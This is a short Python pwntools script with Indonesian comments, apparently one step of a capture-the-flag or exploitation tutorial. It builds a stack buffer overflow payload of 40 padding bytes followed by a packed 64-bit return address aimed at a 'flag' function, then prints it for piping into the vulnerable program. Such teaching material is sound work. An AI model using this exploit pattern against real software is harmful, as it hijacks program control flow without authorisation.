from pwn import *

# Ganti ini dengan alamat yang Anda temukan di Langkah 2
alamat_target_flag = 0x004011a9 

# Ganti ini dengan offset yang Anda temukan di Langkah 1
offset = 40

# 1. Buat padding (Junk)
padding = b'A' * offset

# 2. Kemas alamat target (ini akan mengubah 0x004011a9 menjadi bytes)
# 'p64' adalah untuk program 64-bit. Gunakan 'p32' jika 32-bit.
alamat_packed = p64(alamat_target_flag)

# 3. Payload Anda adalah gabungannya
payload = padding + alamat_packed

# 4. Simpan ke file atau kirim langsung ke program
print(payload)
# (Anda bisa 'pipe' output ini ke program)